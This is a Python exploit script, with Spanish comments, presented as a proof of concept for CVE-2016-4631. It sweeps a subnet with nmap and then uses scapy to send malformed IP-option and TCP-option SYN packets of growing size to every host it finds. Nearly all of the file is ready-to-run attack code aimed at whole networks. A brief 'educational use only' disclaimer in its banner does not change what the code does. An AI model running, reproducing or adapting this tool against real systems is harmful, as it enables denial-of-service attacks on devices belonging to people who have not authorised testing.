#!/usr/bin/env python3
"""
FuxIOS.py - CVE-2016-4631 Exploit PoC
Actualizado para Python 3 con mejoras modernas
"""

import os
import sys
import time
import socket
import argparse
import ipaddress
import logging
from typing import List, Optional
try:
    import nmap
except ImportError:
    print("Error: python-nmap no está instalado. Instala con: pip install python-nmap")
    sys.exit(1)

import struct
try:
    from scapy.all import IP, TCP, send
    from scapy.layers.inet import ICMP
    import scapy.config
except ImportError:
    print("Error: scapy no está instalado. Instala con: pip install scapy")
    sys.exit(1)

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('fuxios_exploit.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

def banner() -> str:
    """Muestra el banner del script"""
    return '''
    ######################################################
    # FuxIOS.py v2.0 - CVE-2016-4631 PoC                #
    # CODED BY -> 3xplo1t_ | Actualizado para Python 3  #
    # DISCLAIMER:                                        #
    # Este PoC es solo para pruebas y fines educativos  #
    # Usar únicamente en entornos autorizados           #
    # ¡Diviértete y recuerda, F0LloW_Th3_R4ts <:8)~~!   #
    ######################################################
    '''
 
def validate_ip(ip: str) -> bool:
    """Valida si una dirección IP es correcta"""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def validate_subnet(subnet: str) -> bool:
    """Valida si una subred es correcta"""
    try:
        ipaddress.ip_network(subnet, strict=False)
        return True
    except ValueError:
        return False

def is_root() -> bool:
    """Verifica si el script se ejecuta con privilegios de administrador"""
    if os.name == 'nt':  # Windows
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin()
        except Exception:
            return False
    else:  # Unix/Linux
        return os.geteuid() == 0

def scan_network(subnet: str) -> List[str]:
    """Escanea la red para encontrar hosts activos"""
    try:
        logger.info(f"Escaneando red: {subnet}")
        nm = nmap.PortScanner()
        nm.scan(hosts=subnet, arguments='-sn')  # -sn es más moderno que -sP
        hosts = nm.all_hosts()
        
        # Ordenar IPs numéricamente
        sorted_hosts = sorted(hosts, key=lambda ip: struct.unpack("!L", socket.inet_aton(ip))[0])
        logger.info(f"Encontrados {len(sorted_hosts)} hosts activos")
        return sorted_hosts
    except Exception as e:
        logger.error(f"Error durante el escaneo: {e}")
        return []

def create_malicious_packet(src_ip: str, dst_ip: str, payload: str):
    """Crea el paquete malicioso para explotar CVE-2016-4631"""
    try:
        # Paquete IP con opciones malformadas
        ip_packet = IP(src=src_ip, dst=dst_ip, options=payload)
        
        # TCP con opciones específicas para la vulnerabilidad
        tcp_packet = TCP(
            dport=80,  # Puerto destino
            flags="S",  # Bandera SYN
            options=[(19, b"x" * 18), (19, b"x" * 18)]  # Opciones TCP malformadas
        )
        
        return ip_packet / tcp_packet
    except Exception as e:
        logger.error(f"Error creando paquete: {e}")
        return None

def exploit(src_ip: str = '192.168.1.95', subnet: str = '192.168.1.0/24', 
           max_payload_size: int = 40, delay: float = 0.2) -> None:
    """
    Función principal del exploit para CVE-2016-4631
    
    Args:
        src_ip: IP origen del ataque
        subnet: Subred objetivo
        max_payload_size: Tamaño máximo del payload
        delay: Retraso entre paquetes
    """
    
    # Validaciones de entrada
    if not validate_ip(src_ip):
        logger.error(f"IP origen inválida: {src_ip}")
        return
        
    if not validate_subnet(subnet):
        logger.error(f"Subred inválida: {subnet}")
        return
    
    # Escanear red
    target_hosts = scan_network(subnet)
    if not target_hosts:
        logger.warning("No se encontraron hosts activos")
        return
    
    logger.info(f"Iniciando exploit contra {len(target_hosts)} hosts")
    logger.info(f"Configuración: src={src_ip}, delay={delay}s, max_payload={max_payload_size}")
    
    try:
        # Generar payloads incrementales
        for i in range(1, max_payload_size + 1):
            payload = "x" * i
            logger.info(f"Enviando payload de tamaño {i}")
            
            for host in target_hosts:
                try:
                    packet = create_malicious_packet(src_ip, host, payload)
                    if packet:
                        logger.info(f"[*] Enviando a {host} | Payload: {len(payload)} bytes")
                        send(packet, verbose=False)
                        time.sleep(delay)
                except Exception as e:
                    logger.error(f"Error enviando a {host}: {e}")
                    continue
                    
    except KeyboardInterrupt:
        logger.info("Exploit interrumpido por el usuario")
    except Exception as e:
        logger.error(f"Error durante el exploit: {e}")

def parse_arguments() -> argparse.Namespace:
    """Parsea los argumentos de línea de comandos"""
    parser = argparse.ArgumentParser(
        description="FuxIOS.py v2.0 - CVE-2016-4631 PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=banner()
    )
    
    parser.add_argument(
        '-s', '--source',
        default='192.168.1.95',
        help='IP origen del ataque (por defecto: 192.168.1.95)'
    )
    
    parser.add_argument(
        '-n', '--network',
        default='192.168.1.0/24',
        help='Subred objetivo (por defecto: 192.168.1.0/24)'
    )
    
    parser.add_argument(
        '-m', '--max-payload',
        type=int,
        default=40,
        help='Tamaño máximo del payload (por defecto: 40)'
    )
    
    parser.add_argument(
        '-d', '--delay',
        type=float,
        default=0.2,
        help='Retraso entre paquetes en segundos (por defecto: 0.2)'
    )
    
    parser.add_argument(
        '--interactive',
        action='store_true',
        help='Modo interactivo (compatibilidad con versión anterior)'
    )
    
    return parser.parse_args()

def interactive_mode() -> None:
    """Modo interactivo para compatibilidad con la versión anterior"""
    print(banner())
    
    print("Modo interactivo de FuxIOS.py v2.0")
    print("=" * 50)
    
    use_default = input(
        'Configuración por defecto:\n'
        'Tu IP: 192.168.1.95\n'
        'Tu subred: 192.168.1.0/24\n'
        '¿Usar configuración personalizada? [s/n]: '
    ).lower().strip()
    
    if use_default in ['n', 'no']:
        src_ip = '192.168.1.95'
        subnet = '192.168.1.0/24'
    else:
        while True:
            src_ip = input('Ingresa TU dirección IP (ej: 192.168.1.95): ').strip()
            if validate_ip(src_ip):
                break
            print("IP inválida, intenta de nuevo.")
        
        while True:
            subnet = input('Ingresa la dirección de subred (ej: 192.168.1.0/24): ').strip()
            if validate_subnet(subnet):
                break
            print("Subred inválida, intenta de nuevo.")
    
    print(f"\nIniciando exploit con IP origen: {src_ip}, Subred: {subnet}")
    exploit(src_ip=src_ip, subnet=subnet)

def main():
    """Función principal del programa"""
    
    try:
        args = parse_arguments()
        
        # Si solo pide ayuda, no verificar privilegios
        if len(sys.argv) == 1 or '--help' in sys.argv or '-h' in sys.argv:
            return
            
        # Verificar privilegios de administrador solo para ejecución real
        if not is_root():
            print('\n❌ Debes ejecutar este script como administrador/root para usar Scapy\n')
            if os.name == 'nt':
                print('En Windows: Ejecuta como "Ejecutar como administrador"')
            else:
                print('En Linux/Unix: Ejecuta con sudo')
            sys.exit(1)
        
        if args.interactive:
            interactive_mode()
        else:
            print(banner())
            logger.info("Iniciando FuxIOS.py v2.0 - CVE-2016-4631 PoC")
            
            exploit(
                src_ip=args.source,
                subnet=args.network,
                max_payload_size=args.max_payload,
                delay=args.delay
            )
            
    except KeyboardInterrupt:
        print('\n\n⚠️  Exploit abortado por el usuario\n')
        logger.info("Exploit interrumpido por el usuario")
    except Exception as e:
        logger.error(f"Error inesperado: {e}")
        print(f"\n❌ Error: {e}\n")
    finally:
        if '--help' not in sys.argv and '-h' not in sys.argv and len(sys.argv) > 1:
            print("Exploit finalizado.")

if __name__ == '__main__':
    main()

